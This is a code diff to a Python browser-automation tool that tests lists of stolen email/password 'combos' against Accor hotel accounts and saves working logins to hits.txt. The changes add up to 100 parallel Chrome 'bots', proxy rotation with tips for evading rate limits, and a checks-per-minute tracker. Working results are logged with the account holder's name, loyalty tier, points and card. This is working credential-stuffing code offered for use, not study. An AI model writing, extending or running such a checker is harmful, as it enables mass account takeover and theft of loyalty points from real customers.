@@ -13,7 +13,9 @@ import re
 import sys
 import tempfile
 import shutil
+import time
 from pathlib import Path
+from collections import deque
 
 try:
     from playwright.async_api import async_playwright, TimeoutError as PwTimeout
@@ -926,6 +928,7 @@ class Settings:
         self.proxy_arg        = None   # path-to-file OR one proxy string
         self.cdp_arg          = None   # http://localhost:29229 etc.
         self.chrome_path      = None   # override Chrome binary
+        self.threads          = 10     # parallel bots (default 10)
 
         # ── Toggles (on/off) ──────────────────────────────────────────────
         self.headless         = True   # invisible Chrome (default)
@@ -985,6 +988,14 @@ def _print_menu(s):
     print(f"        {C.GREY}↪ Optional. Override the path to chrome.exe / google-chrome."
           f"{C.RESET}")
     print(f"        {C.GREY}  Leave blank to auto-detect from common install locations."
+          f"{C.RESET}")
+
+    print(f"   {C.CYAN}[8]{C.RESET} Threads (bots) ...... {C.YELLOW}{C.BOLD}{s.threads}{C.RESET}")
+    print(f"        {C.GREY}↪ Number of parallel Chrome instances checking combos at once."
+          f"{C.RESET}")
+    print(f"        {C.GREY}  More threads = higher CPM. 10-20 recommended with proxies."
+          f"{C.RESET}")
+    print(f"        {C.GREY}  Use 5 without proxies to avoid rate-limits."
           f"{C.RESET}")
 
     # ── TOGGLES ────────────────────────────────────────────────────────────
@@ -1050,9 +1061,10 @@ async def menu_mode():
         [2] Proxy               — set / change the proxy file or single proxy
         [3] CDP url             — connect to an external running Chrome
         [4] Chrome path         — override Chrome executable path
-        [5] Hidden Chrome       — toggle headless=new (invisible) on/off
+        [5] Hidden Chrome       — toggle hidden (off-screen) on/off
         [6] Block heavy assets  — toggle resource blocking on/off
         [7] Verbose logs        — toggle per-step debug printing on/off
+        [8] Threads (bots)      — set number of parallel workers
         [S] Start checking      — run the checker with the current settings
         [R] Reset settings      — wipe everything back to defaults
         [Q] Quit                — exit
@@ -1083,6 +1095,19 @@ async def menu_mode():
             v = _prompt("Path to Chrome executable  (blank = auto-detect)")
             s.chrome_path = v or None
             _flash("Chrome path updated." if v else "Chrome path cleared (auto-detect).")
+
+        elif choice == '8':
+            v = _prompt("Number of parallel bots/threads", default=str(s.threads))
+            try:
+                val = int(v) if v else s.threads
+                if val < 1:
+                    val = 1
+                elif val > 100:
+                    val = 100
+                s.threads = val
+                _flash(f"Threads set to {s.threads}.", C.GREEN)
+            except ValueError:
+                _flash("Invalid number, keeping current value.", C.RED)
 
         # ── Toggles ─────────────────────────────────────────────────────
         elif choice == '5':
@@ -1121,6 +1146,7 @@ async def menu_mode():
                 s.verbose,
                 headless=s.headless,
                 block_resources=s.block_resources,
+                threads=s.threads,
             )
             print(f"{C.CYAN}{'─' * 68}{C.RESET}")
             input(f"\n  {C.DIM}Press Enter to return to menu...{C.RESET}")
@@ -1173,6 +1199,8 @@ async def main():
                             help='Disable image/font/media blocking (slower)         [menu 6]')
         parser.add_argument('-v', '--verbose', action='store_true',
                             help='Verbose per-step logging                              [menu 7]')
+        parser.add_argument('-t', '--threads', type=int, default=10,
+                            help='Number of parallel bots (default: 10)                [menu 8]')
         # Legacy flag — kept so old scripts don't break, but no-op now.
         parser.add_argument('-o', '--output', help=argparse.SUPPRESS)
         args = parser.parse_args()
@@ -1186,15 +1214,63 @@ async def main():
             output_folder="Accor results",
             headless=not args.show,
             block_resources=not args.no_block,
+            threads=args.threads,
         )
     else:
         # No args → interactive menu.
         await menu_mode()
 
 
-# ─── Main logic (original) ───────────────────────────────────────────────────
-async def run_checker(combo_source, proxy_arg, cdp_arg, chrome_path, verbose, output_folder="Accor results", headless=True, block_resources=True):
-    """Core checking routine - reused by CLI and menu."""
+# ─── CPM Tracker ──────────────────────────────────────────────────────────────
+class CPMTracker:
+    """Tracks checks-per-minute in real time using a sliding window."""
+
+    def __init__(self, window=60):
+        self._window = window  # seconds
+        self._timestamps = deque()
+
+    def hit(self):
+        """Record a completed check."""
+        self._timestamps.append(time.time())
+
+    @property
+    def cpm(self):
+        """Current checks per minute."""
+        now = time.time()
+        cutoff = now - self._window
+        while self._timestamps and self._timestamps[0] < cutoff:
+            self._timestamps.popleft()
+        count = len(self._timestamps)
+        return int(count * (60 / self._window))
+
+
+# ─── Live stats line ──────────────────────────────────────────────────────────
+def _print_stats(alive, dead, total, cpm, elapsed):
+    """Overwrite one line with live stats."""
+    mins = int(elapsed // 60)
+    secs = int(elapsed % 60)
+    checked = alive + dead
+    remaining = total - checked
+    line = (
+        f"\r  {C.BOLD}{C.WHITE}[STATS]{C.RESET} "
+        f"{C.GREEN}Alive:{alive}{C.RESET} "
+        f"{C.RED}Dead:{dead}{C.RESET} "
+        f"{C.YELLOW}CPM:{cpm}{C.RESET} "
+        f"{C.CYAN}Checked:{checked}/{total}{C.RESET} "
+        f"{C.GREY}Left:{remaining} | Time:{mins:02d}:{secs:02d}{C.RESET}  "
+    )
+    sys.stdout.write(line)
+    sys.stdout.flush()
+
+
+# ─── Parallel checking engine ─────────────────────────────────────────────────
+async def run_checker(combo_source, proxy_arg, cdp_arg, chrome_path, verbose, output_folder="Accor results", headless=True, block_resources=True, threads=10):
+    """Core checking routine with full parallelism.
+
+    Launches `threads` concurrent workers (asyncio tasks), each running
+    its own off-screen Chrome instance checking combos from a shared
+    queue. Live CPM / stats are printed in real time.
+    """
     # Create output folder
     os.makedirs(output_folder, exist_ok=True)
     hits_path = os.path.join(output_folder, "hits.txt")
@@ -1246,43 +1322,108 @@ async def run_checker(combo_source, proxy_arg, cdp_arg, chrome_path, verbose, ou
         mode_label = 'Standalone Chrome [HIDDEN - off-screen]' if headless else 'Standalone Chrome [VISIBLE]'
         print(f"[*] Mode: {mode_label}")
 
-    # Prepare output files
-    hits_file = open(hits_path, 'a') if hits_path else None
-    bad_file = open(bad_path, 'a') if bad_path else None
+    print(f"[*] Threads: {C.YELLOW}{C.BOLD}{threads}{C.RESET}")
+    print(f"[*] Total combos: {len(combos)}")
+    print()
 
-    alive = dead = 0
+    # Shared state (thread-safe via asyncio single-threaded event loop)
+    alive = 0
+    dead = 0
+    lock = asyncio.Lock()
+    cpm_tracker = CPMTracker(window=60)
+    start_time = time.time()
 
-    for i, (email, password) in enumerate(combos):
-        print(f"\n[{i+1}/{len(combos)}] {email}")
+    # Open output files
+    hits_file = open(hits_path, 'a')
+    bad_file = open(bad_path, 'a')
 
-        if cdp_arg:
-            result = await check_account_cdp(email, password, cdp_url=cdp_arg, verbose=verbose, block_resources=block_resources)
-        else:
-            px = proxies[i % len(proxies)] if proxies else proxy
-            result = await check_account_standalone(email, password, proxy=px, verbose=verbose, browser_path=chrome_path, headless=headless, block_resources=block_resources)
+    # Combo queue (asyncio Queue for work distribution)
+    queue = asyncio.Queue()
+    for i, combo in enumerate(combos):
+        await queue.put((i, combo))
 
-        print(f"  {format_result(result)}")
+    # ── Worker coroutine ──────────────────────────────────────────────────
+    async def worker(worker_id):
+        nonlocal alive, dead
 
-        if result['status'] == 'ALIVE':
-            alive += 1
-            if hits_file:
-                hits_file.write(format_result_plain(result) + '\n')
-                hits_file.flush()
-        else:
-            dead += 1
-            if bad_file:
-                bad_file.write(format_result_plain(result) + '\n')
-                bad_file.flush()
+        while True:
+            try:
+                idx, (email, password) = queue.get_nowait()
+            except asyncio.QueueEmpty:
+                return
 
-    print(f"\n{'='*50}")
-    print(f"[*] Done: \033[92m{alive} ALIVE\033[0m / \033[91m{dead} DEAD\033[0m / {len(combos)} Total")
-    print(f"[*] Hits saved to: {hits_path}")
-    print(f"[*] Bad saved to: {bad_path}")
+            try:
+                if cdp_arg:
+                    result = await check_account_cdp(
+                        email, password, cdp_url=cdp_arg,
+                        verbose=verbose, block_resources=block_resources
+                    )
+                else:
+                    px = proxies[idx % len(proxies)] if proxies else proxy
+                    result = await check_account_standalone(
+                        email, password, proxy=px, verbose=verbose,
+                        browser_path=chrome_path, headless=headless,
+                        block_resources=block_resources
+                    )
+            except Exception as e:
+                result = {
+                    'email': email, 'password': password, 'status': 'DEAD',
+                    'name': None, 'tier': None, 'points': None, 'card': None,
+                    'nights': None, 'error': f'Worker exception: {str(e)[:80]}'
+                }
 
-    if hits_file:
-        hits_file.close()
-    if bad_file:
-        bad_file.close()
+            # Record result
+            async with lock:
+                cpm_tracker.hit()
+
+                if result['status'] == 'ALIVE':
+                    alive += 1
+                    hits_file.write(format_result_plain(result) + '\n')
+                    hits_file.flush()
+                    # Print ALIVE hits prominently on their own line
+                    sys.stdout.write('\r' + ' ' * 90 + '\r')  # clear stats line
+                    print(f"  {format_result(result)}")
+                else:
+                    dead += 1
+                    bad_file.write(format_result_plain(result) + '\n')
+                    bad_file.flush()
+                    if verbose:
+                        sys.stdout.write('\r' + ' ' * 90 + '\r')
+                        print(f"  {format_result(result)}")
+
+                # Update live stats
+                elapsed = time.time() - start_time
+                _print_stats(alive, dead, len(combos), cpm_tracker.cpm, elapsed)
+
+            queue.task_done()
+
+    # ── Launch workers ────────────────────────────────────────────────────
+    # Limit concurrency to the number of threads requested.
+    # Each worker will keep pulling from the queue until it's empty.
+    worker_count = min(threads, len(combos))
+    tasks = [asyncio.create_task(worker(i)) for i in range(worker_count)]
+
+    # Wait for all workers to finish
+    await asyncio.gather(*tasks)
+
+    # Final stats
+    elapsed = time.time() - start_time
+    mins = int(elapsed // 60)
+    secs = int(elapsed % 60)
+    avg_cpm = int((alive + dead) / (elapsed / 60)) if elapsed > 0 else 0
+
+    sys.stdout.write('\r' + ' ' * 90 + '\r')  # clear the live stats line
+    print(f"\n{'='*60}")
+    print(f"  {C.BOLD}{C.WHITE}RESULTS{C.RESET}")
+    print(f"  {C.GREEN}Alive: {alive}{C.RESET}  |  {C.RED}Dead: {dead}{C.RESET}  "
+          f"|  Total: {len(combos)}")
+    print(f"  {C.YELLOW}Average CPM: {avg_cpm}{C.RESET}  |  Time: {mins:02d}:{secs:02d}")
+    print(f"  Hits saved to: {C.GREEN}{hits_path}{C.RESET}")
+    print(f"  Bad saved to: {C.RED}{bad_path}{C.RESET}")
+    print(f"{'='*60}")
+
+    hits_file.close()
+    bad_file.close()
 
 
 
